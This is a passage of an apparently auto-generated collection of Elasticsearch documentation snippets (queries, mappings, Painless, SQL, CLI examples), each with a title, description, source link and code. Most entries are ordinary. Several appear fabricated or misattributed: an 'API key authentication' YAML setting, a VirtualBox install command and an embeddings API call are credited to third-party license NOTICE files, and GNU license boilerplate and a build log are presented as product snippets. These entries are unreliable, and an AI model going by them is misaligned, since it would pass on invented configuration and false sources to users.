Elasticsearch\nCODE:\n```\n{\"bool\":{\"must\":[{\"term\":{\"event.category\":{\"value\":\"process\"}}},{\"bool\":{\"should\":[{\"prefix\":{\"user_name\":{\"value\":\"A\",\"case_insensitive\":true,\"boost\":1.0}}},{\"prefix\":{\"user_name\":{\"value\":\"B\",\"case_insensitive\":true,\"boost\":1.0}}}],\"boost\":1.0}}],\"boost\":1.0}}\n```\n\n----------------------------------------\n\nTITLE: Advanced Sync Rules for Redis Connector - Fetching Keys Starting with 'alpha'\nDESCRIPTION: JSON configuration for advanced sync rules to fetch Redis database records where keys start with 'alpha'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-redis.md#2025-04-21_snippet_3\n\nLANGUAGE: js\nCODE:\n```\n[\n  {\n    \"database\": 0,\n    \"key_pattern\": \"alpha*\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Reverse Token Filter for Suffix Wildcard Optimization in Elasticsearch\nDESCRIPTION: Creates an Elasticsearch index with custom analysis settings that combines reverse and edge_ngram token filters to optimize suffix wildcard queries. This technique helps speed up *xyz pattern searches.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/percolator.md#2025-04-21_snippet_10\n\nLANGUAGE: console\nCODE:\n```\nPUT my_queries2\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"wildcard_suffix\": {\n          \"type\": \"custom\",\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"reverse\",\n            \"wildcard_edge_ngram\"\n          ]\n        },\n        \"wildcard_suffix_search_time\": {\n          \"type\": \"custom\",\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"lowercase\",\n            \"reverse\"\n          ]\n        }\n      },\n      \"filter\": {\n        \"wildcard_edge_ngram\": {\n          \"type\": \"edge_ngram\",\n          \"min_gram\": 1,\n          \"max_gram\": 32\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"query\": {\n        \"type\": \"percolator\"\n      },\n      \"my_field\": {\n        \"type\": \"text\",\n        \"fields\": {\n          \"suffix\": {\n            \"type\": \"text\",\n            \"analyzer\": \"wildcard_suffix\",\n            \"search_analyzer\": \"wildcard_suffix_search_time\" <1>\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Highlighting All Fields in Elasticsearch Search Results\nDESCRIPTION: This snippet shows how to highlight all fields regardless of whether they contain a query match. By setting require_field_match to false, highlighting is applied to all specified fields even if they don't match the query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\" : {\n    \"match\": { \"user.id\": \"kimchy\" }\n  },\n  \"highlight\" : {\n    \"require_field_match\": false,\n    \"fields\": {\n      \"body\" : { \"pre_tags\" : [\"<em>\"], \"post_tags\" : [\"</em>\"] }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Precedence Operator Example in Painless\nDESCRIPTION: Demonstrates the use of parentheses to control operator precedence in arithmetic operations. Shows how precedence affects the order of evaluation in mathematical expressions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-general.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nint x = (5+4)*6;   \nint y = 12/(x-50);\n```\n\n----------------------------------------\n\nTITLE: Using LCASE Function in Elasticsearch SQL\nDESCRIPTION: Returns a string equal to the input with all uppercase characters converted to lowercase. Takes a string expression as input and returns null if the input is null.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-string.md#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nLCASE(string_exp) <1>\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT LCASE('Elastic');\n\nLCASE('Elastic')\n----------------\nelastic\n```\n\n----------------------------------------\n\nTITLE: Interactive Program Copyright Notice\nDESCRIPTION: A template for displaying a short copyright and warranty notice when an interactive program starts. It includes version information and instructions for obtaining more details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-pdf-module-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\nGnomovision version 69, Copyright (C) year name of author\nGnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n`show w'. This is free software, and you are welcome to redistribute\nit under certain conditions; type `show c' for details.\n```\n\n----------------------------------------\n\nTITLE: Configuring Join Field with Disabled Eager Global Ordinals in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an index mapping with a join field that disables eager loading of global ordinals. It defines a relation between 'question' and 'answer' entities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/parent-join.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"my_join_field\": {\n        \"type\": \"join\",\n        \"relations\": {\n           \"question\": \"answer\"\n        },\n        \"eager_global_ordinals\": false\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Converting WKT Point to geo_point in ESQL\nDESCRIPTION: This snippet demonstrates how to use the TO_GEOPOINT function to convert a Well-Known Text (WKT) Point string representation to a geo_point value in Elasticsearch SQL. The function accepts a string input in WKT Point format and returns a geo_point type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/to_geopoint.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW wkt = \"POINT(42.97109630194 14.7552534413725)\"\n| EVAL pt = TO_GEOPOINT(wkt)\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP API Key Authentication in Elasticsearch\nDESCRIPTION: YAML configuration for enabling API key authentication in Elasticsearch. This allows clients to authenticate using API keys instead of usernames and passwords.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.authentication.type: apikey\n```\n\n----------------------------------------\n\nTITLE: Configuring Elasticsearch CLI Library\nDESCRIPTION: Evaluates the build file for the ':libs:cli' project in the Elasticsearch codebase.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/simdvec/output.txt#2025-04-21_snippet_5\n\nLANGUAGE: gradle\nCODE:\n```\n> Configure project :libs:cli\nEvaluating project ':libs:cli' using build file '/Users/rene/dev/elastic/elasticsearch/libs/cli/build.gradle'.\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Analyzer with MinHash and Shingle Filters in Elasticsearch\nDESCRIPTION: This code demonstrates how to create a custom index with a MinHash-based analyzer for document similarity search. It configures a shingle filter to create five-word shingles and a MinHash filter to hash these shingles into 512 buckets, then maps the analyzer to a 'fingerprint' field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-minhash-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"my_shingle_filter\": {      <1>\n          \"type\": \"shingle\",\n          \"min_shingle_size\": 5,\n          \"max_shingle_size\": 5,\n          \"output_unigrams\": false\n        },\n        \"my_minhash_filter\": {\n          \"type\": \"min_hash\",\n          \"hash_count\": 1,          <2>\n          \"bucket_count\": 512,      <3>\n          \"hash_set_size\": 1,       <4>\n          \"with_rotation\": true     <5>\n        }\n      },\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [\n            \"my_shingle_filter\",\n            \"my_minhash_filter\"\n          ]\n        }\n      }\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"fingerprint\": {\n        \"type\": \"text\",\n        \"analyzer\": \"my_analyzer\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Example Usage of elasticsearch-reconfigure-node Tool\nDESCRIPTION: Provides an example of how to use the elasticsearch-reconfigure-node tool with sudo permissions to reconfigure an installed Elasticsearch node, allowing it to join an existing cluster on first start. The example includes the use of an enrollment token.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/reconfigure-node.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nsudo /usr/share/elasticsearch/elasticsearch-reconfigure-node --enrollment-token eyJ2ZXIiOiI4LjAuMCIsImFkciI6WyIxOTIuMTY4LjEuMTY6OTIwMCJdLCJmZ3IiOiI4NGVhYzkyMzAyMWQ1MjcyMmQxNTFhMTQwZmM2ODI5NmE5OWNiNmU0OGVhZjYwYWMxYzljM2I3ZDJjOTg2YTk3Iiwia2V5IjoiUy0yUjFINEJrNlFTMkNEY1dVV1g6QS0wSmJxM3hTRy1haWxoQTdPWVduZyJ9\n```\n\n----------------------------------------\n\nTITLE: Configuring a Mapping with Numeric Fields in Elasticsearch\nDESCRIPTION: This example demonstrates how to configure an Elasticsearch index mapping with different numeric field types, including integer, float, and scaled_float. The example creates an index with fields for number_of_bytes (integer), time_in_seconds (float), and price (scaled_float with a scaling factor of 100).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/number.md#2025-04-22_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"number_of_bytes\": {\n        \"type\": \"integer\"\n      },\n      \"time_in_seconds\": {\n        \"type\": \"float\"\n      },\n      \"price\": {\n        \"type\": \"scaled_float\",\n        \"scaling_factor\": 100\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Rare Terms with Exact Values in Elasticsearch\nDESCRIPTION: Shows how to filter rare terms aggregation using exact value matching. The example includes 'swing' and 'rock' terms while excluding 'jazz'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-rare-terms-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"aggs\": {\n    \"genres\": {\n      \"rare_terms\": {\n        \"field\": \"genre\",\n        \"include\": [ \"swing\", \"rock\" ],\n        \"exclude\": [ \"jazz\" ]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Static Imports for DateFieldScript in Painless Elasticsearch\nDESCRIPTION: Defines static imports for the `DateFieldScript` class, specifically for the `emit` and `parse` methods. These imports are bound to the corresponding `Emit` and `Parse` interfaces within `DateFieldScript`, enabling Painless scripts to collect and parse date values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.date_field.txt#2025-04-21_snippet_1\n\nLANGUAGE: Painless\nCODE:\n```\nstatic_import {\n    # The `emit` callback to collect values for the field\n    void emit(org.elasticsearch.script.DateFieldScript, long) bound_to org.elasticsearch.script.DateFieldScript$Emit\n    # Parse a value from the source to millis since epoch\n    long parse(org.elasticsearch.script.DateFieldScript, def) bound_to org.elasticsearch.script.DateFieldScript$Parse\n}\n```\n\n----------------------------------------\n\nTITLE: Scripted Metric Aggregation Reduce Script Input\nDESCRIPTION: This JavaScript snippet demonstrates the input to the reduce_script in the scripted metric aggregation, containing the results from each shard.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-scripted-metric-aggregation.md#2025-04-21_snippet_6\n\nLANGUAGE: js\nCODE:\n```\n\"states\" : [\n    50,\n    120\n]\n```\n\n----------------------------------------\n\nTITLE: Indexing a Grandchild Document in Elasticsearch Join Field\nDESCRIPTION: This snippet shows how to index a grandchild document ('vote') in a multi-level parent-child relationship. It demonstrates the use of routing to ensure proper shard placement and specifying the parent ID.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/parent-join.md#2025-04-21_snippet_10\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/3?routing=1&refresh <1>\n{\n  \"text\": \"This is a vote\",\n  \"my_join_field\": {\n    \"name\": \"vote\",\n    \"parent\": \"2\" <2>\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining German Stop Words\nDESCRIPTION: Defines German stop words used in Elasticsearch, directing to the respective Lucene documentation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_20\n\nLANGUAGE: markdown\nCODE:\n```\n`_german_`\n:   [German stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/snowball/german_stop.txt)\n```\n\n----------------------------------------\n\nTITLE: Updating Bundle Version with Option 1 Method (cURL)\nDESCRIPTION: This snippet demonstrates how to update the version of an existing bundle extension using the Option 1 method. It sets the version to '8.*' to ensure compatibility with all 8.x versions of Elasticsearch.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/cloud/ec-plugins-guide.md#2025-04-21_snippet_13\n\nLANGUAGE: sh\nCODE:\n```\ncurl -X POST \\\n  https://api.elastic-cloud.com/api/v1/deployments/extensions/EXTENSION_ID \\\n  -H \"Authorization: ApiKey $CLOUD_API_KEY\" \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n   \"extension_type\" : \"bundle\",\n    \"name\": \"custom-bundle\",\n   \"version\" : \"8.*\"\n}'\n```\n\n----------------------------------------\n\nTITLE: Text Categorization with Filters\nDESCRIPTION: Example showing how to use categorization_filters to exclude specific patterns (like usernames) from categorization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-categorize-text-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST log-messages/_search?filter_path=aggregations\n{\n  \"aggs\": {\n    \"categories\": {\n      \"categorize_text\": {\n        \"field\": \"message\",\n        \"categorization_filters\": [\"\\\\w+\\\\_\\\\d{3}\"]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Service Tokens Command Synopsis\nDESCRIPTION: Command syntax showing the three main operations: create, list, and delete service tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/service-tokens-command.md#2025-04-21_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-service-tokens\n([create <service_account_principal> <token_name>]) |\n([list] [<service_account_principal>]) |\n([delete <service_account_principal> <token_name>])\n```\n\n----------------------------------------\n\nTITLE: Defining Text Similarity Rerank Retriever\nDESCRIPTION: Elasticsearch query using text similarity reranker to search and rerank movies based on plot similarity\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrievers.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nPOST movies/_search\n{\n  \"retriever\": {\n    \"text_similarity_reranker\": {\n      \"retriever\": {\n        \"standard\": {\n          \"query\": {\n            \"match\": {\n              \"genre\": \"drama\"\n            }\n          }\n        }\n      },\n      \"field\": \"plot\",\n      \"inference_id\": \"my-msmarco-minilm-model\",\n      \"inference_text\": \"films that explore psychological depths\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Failed Reindex Status in Elasticsearch\nDESCRIPTION: This snippet shows the response from the reindex status API when a failure occurs during the reindex process, such as a deleted index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reindex-data-stream.md#2025-04-21_snippet_11\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"start_time_millis\": 1737676174349,\n  \"complete\": false,\n  \"total_indices_in_data_stream\": 4,\n  \"total_indices_requiring_upgrade\": 3,\n  \"successes\": 1,\n  \"in_progress\": [],\n  \"pending\": 1,\n  \"errors\": [\n    {\n      \"index\": \".ds-my-data-stream-2025.01.23-000002\",\n      \"message\": \"index [.ds-my-data-stream-2025.01.23-000002] does not exist\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with the Default Path Hierarchy Tokenizer in Elasticsearch\nDESCRIPTION: This example demonstrates using the default path_hierarchy tokenizer to analyze a file path '/one/two/three', which produces three terms representing each level of the path hierarchy.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pathhierarchy-tokenizer.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _analyze\n{\n  \"tokenizer\": \"path_hierarchy\",\n  \"text\": \"/one/two/three\"\n}\n```\n\nLANGUAGE: text\nCODE:\n```\n[ /one, /one/two, /one/two/three ]\n```\n\n----------------------------------------\n\nTITLE: Field Type Support Matrix in Markdown\nDESCRIPTION: A markdown table documenting the supported field types for an ESQL function, showing that all listed field types return boolean values. This is auto-generated documentation that should not be manually edited.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/is_null.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | result |\n| --- | --- |\n| boolean | boolean |\n| cartesian_point | boolean |\n| cartesian_shape | boolean |\n| date | boolean |\n| date_nanos | boolean |\n| double | boolean |\n| geo_point | boolean |\n| geo_shape | boolean |\n| integer | boolean |\n| ip | boolean |\n| keyword | boolean |\n| long | boolean |\n| text | boolean |\n| unsigned_long | boolean |\n| version | boolean |\n```\n\n----------------------------------------\n\nTITLE: Complex Pattern Matching for Functions in Elasticsearch SQL\nDESCRIPTION: Example of using SHOW FUNCTIONS with a more complex LIKE pattern using wildcards to match functions containing 'DAY'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-functions.md#2025-04-21_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nSHOW FUNCTIONS LIKE '%DAY%';\n\n     name      |     type\n---------------+---------------\nDAY            |SCALAR\nDAYNAME        |SCALAR\nDAYOFMONTH     |SCALAR\nDAYOFWEEK      |SCALAR\nDAYOFYEAR      |SCALAR\nDAY_NAME       |SCALAR\nDAY_OF_MONTH   |SCALAR\nDAY_OF_WEEK    |SCALAR\nDAY_OF_YEAR    |SCALAR\nHOUR_OF_DAY    |SCALAR\nISODAYOFWEEK   |SCALAR\nISO_DAY_OF_WEEK|SCALAR\nMINUTE_OF_DAY  |SCALAR\nTODAY          |SCALAR\n```\n\n----------------------------------------\n\nTITLE: Preserve Data Across Node Restarts\nDESCRIPTION: This command preserves the restored index data to avoid downloading and restoring them on every node restart by using the system property `-Deql.test.preserve.data=true`.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/qa/correctness/README.md#2025-04-21_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew :x-pack:plugin:eql:qa:correctness:javaRestTest -Deql.test.preserve.data=true\n```\n\n----------------------------------------\n\nTITLE: Final Scripted Metric Aggregation Response\nDESCRIPTION: This JavaScript snippet shows the final response of the scripted metric aggregation, including the total profit calculated across all shards.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-scripted-metric-aggregation.md#2025-04-21_snippet_7\n\nLANGUAGE: js\nCODE:\n```\n{\n  ...\n\n  \"aggregations\": {\n    \"profit\": {\n      \"value\": 170\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Inefficient Filter Aggregation in Elasticsearch\nDESCRIPTION: This snippet demonstrates a less efficient way of using filter aggregation, which should be avoided in favor of the top-level query approach shown in the previous example.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-filter-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search?size=0&filter_path=aggregations\n{\n  \"aggs\": {\n    \"t_shirts\": {\n      \"filter\": { \"term\": { \"type\": \"t-shirt\" } },\n      \"aggs\": {\n        \"avg_price\": { \"avg\": { \"field\": \"price\" } }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Run Tests Against a Manually Started ES Node\nDESCRIPTION: This command runs a specific query against a locally running ElasticSearch node, allowing a user to test and debug with the cluster configuration specified by the `-Dtests` parameters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/eql/qa/correctness/README.md#2025-04-21_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\n./gradlew ':x-pack:plugin:eql:qa:correctness:javaRestTest' --tests \"org.elasticsearch.xpack.eql.EsEQLCorrectnessIT.test {<queryNo>}\" -Dtests.rest.cluster=localhost:9200 -Dtests.cluster=localhost:9200 -Dtests.clustername=runTask-0\n```\n\n----------------------------------------\n\nTITLE: Boolean OR with Def Type\nDESCRIPTION: Illustrates boolean OR operations using the dynamic 'def' type with implicit type casting and logical OR combinations\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_34\n\nLANGUAGE: painless\nCODE:\n```\ndef x = false;     \ndef y = x || true; \ny = false;         \ny = y || x;        \n```\n\n----------------------------------------\n\nTITLE: Using Word Delimiter Graph Filter with Analyze API in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the word_delimiter_graph filter with the analyze API to split a complex token into normalized tokens using the filter's default rules. The request specifies the tokenizer and filter to be used.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-word-delimiter-graph-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"keyword\",\n  \"filter\": [ \"word_delimiter_graph\" ],\n  \"text\": \"Neil's-Super-Duper-XL500--42+AutoCoder\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Word Delimiter Graph Token Filter\nDESCRIPTION: This JSON configuration demonstrates how to set up a custom word delimiter graph token filter in Elasticsearch. It includes options for token processing such as type mapping and handling of case transitions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-word-delimiter-graph-tokenfilter.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"my_analyzer\": {\n          \"tokenizer\": \"keyword\",\n          \"filter\": [ \"my_custom_word_delimiter_graph_filter\" ]\n        }\n      },\n      \"filter\": {\n        \"my_custom_word_delimiter_graph_filter\": {\n          \"type\": \"word_delimiter_graph\",\n          \"type_table\": [ \"- => ALPHA\" ],\n          \"split_on_case_change\": false,\n          \"split_on_numerics\": false,\n          \"stem_english_possessive\": true\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Identifying Permission Field Usage - Java\nDESCRIPTION: This snippet illustrates a common pattern where a static final RuntimePermission is defined and then checked using the SecurityManager. It highlights how specific permission types are recognized.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/entitlement/tools/securitymanager-scanner/README.md#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nprivate static final RuntimePermission INET_ADDRESS_RESOLVER_PERMISSION =\nnew RuntimePermission(\"inetAddressResolverProvider\");\n...\nsm.checkPermission(INET_ADDRESS_RESOLVER_PERMISSION);\n```\n\n----------------------------------------\n\nTITLE: Including Description for LOG Function\nDESCRIPTION: This snippet includes the description of the LOG function from an external markdown file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/log.md#2025-04-21_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n:::{include} ../description/log.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Multiplication with 'def' Type in Painless\nDESCRIPTION: Demonstrates multiplication using the '*' operator with the 'def' type in Painless. The 'def' type infers the type dynamically, impacting the result and subsequent operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_15\n\nLANGUAGE: painless\nCODE:\n```\ndef x = 5*4; <1>\ndef y = x*2; <2>\n```\n\n----------------------------------------\n\nTITLE: Interactive Program Copyright Notice Example\nDESCRIPTION: An example of a short copyright notice to be displayed when an interactive program starts. It includes the program name, version, copyright information, and brief instructions for viewing warranty and redistribution details.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/ingest-attachment/licenses/tika-parser-text-module-NOTICE.txt#2025-04-22_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\nGnomovision version 69, Copyright (C) year name of author\nGnomovision comes with ABSOLUTELY NO WARRANTY; for details type\n`show w'. This is free software, and you are welcome to redistribute\nit under certain conditions; type `show c' for details.\n```\n\n----------------------------------------\n\nTITLE: Generating Text Embeddings with Elasticsearch ML API\nDESCRIPTION: API call to generate text embeddings using a prebuilt ML model. This example creates vector representations for text that can be used for semantic search and other natural language processing tasks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/google-api-services-storage-NOTICE.txt#2025-04-21_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nPOST _ml/trained_models/my_embedding_model/_infer\n{\n  \"docs\": {\n    \"text_field\": \"Elasticsearch is great for search and analytics.\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting up and querying geo_point data in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to create an index with a geo_point field, insert sample data, and perform a geo_centroid aggregation on the location field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-geocentroid-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /museums\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"geo_point\"\n      }\n    }\n  }\n}\n\nPOST /museums/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"location\": \"POINT (4.912350 52.374081)\", \"city\": \"Amsterdam\", \"name\": \"NEMO Science Museum\"}\n{\"index\":{\"_id\":2}}\n{\"location\": \"POINT (4.901618 52.369219)\", \"city\": \"Amsterdam\", \"name\": \"Museum Het Rembrandthuis\"}\n{\"index\":{\"_id\":3}}\n{\"location\": \"POINT (4.914722 52.371667)\", \"city\": \"Amsterdam\", \"name\": \"Nederlands Scheepvaartmuseum\"}\n{\"index\":{\"_id\":4}}\n{\"location\": \"POINT (4.405200 51.222900)\", \"city\": \"Antwerp\", \"name\": \"Letterenhuis\"}\n{\"index\":{\"_id\":5}}\n{\"location\": \"POINT (2.336389 48.861111)\", \"city\": \"Paris\", \"name\": \"Musée du Louvre\"}\n{\"index\":{\"_id\":6}}\n{\"location\": \"POINT (2.327000 48.860000)\", \"city\": \"Paris\", \"name\": \"Musée d'Orsay\"}\n\nPOST /museums/_search?size=0\n{\n  \"aggs\": {\n    \"centroid\": {\n      \"geo_centroid\": {\n        \"field\": \"location\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Limiting Network Interface to IPv4 in Elasticsearch YAML\nDESCRIPTION: Configures the node to use only IPv4 addresses of a specific network interface (en0 in this case).\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nnetwork.host: \"_en0:ipv4_\"\n```\n\n----------------------------------------\n\nTITLE: Moving Min Function Example\nDESCRIPTION: Example of using the pre-built min function in a moving function aggregation to find minimum values in the window.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-movfn-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPOST /_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"my_date_histo\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"1M\"\n      },\n      \"aggs\": {\n        \"the_sum\": {\n          \"sum\": { \"field\": \"price\" }\n        },\n        \"the_moving_min\": {\n          \"moving_fn\": {\n            \"buckets_path\": \"the_sum\",\n            \"window\": 10,\n            \"script\": \"MovingFunctions.min(values)\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing VirtualBox on Ubuntu with Apt\nDESCRIPTION: Command to install VirtualBox on Ubuntu Linux using the apt package manager, showing how to include additional required packages.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/repository-gcs/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nsudo apt-get install virtualbox-ose virtualbox-ose-dkms\n```\n\n----------------------------------------\n\nTITLE: Field Capabilities API with Alias\nDESCRIPTION: Demonstrates how to use wildcard patterns with field aliases in the field capabilities API. The pattern matches both concrete fields and aliases.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/field-alias.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET trips/_field_caps?fields=route_*,transit_mode\n```\n\n----------------------------------------\n\nTITLE: Implementing Field Value Factor with Script Score\nDESCRIPTION: Shows how to implement field_value_factor using a script with Math.log10 calculation and factor parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_9\n\nLANGUAGE: js\nCODE:\n```\n\"script\" : {\n    \"source\" : \"Math.log10(doc['field'].value * params.factor)\",\n    \"params\" : {\n        \"factor\" : 5\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Hindi Stop 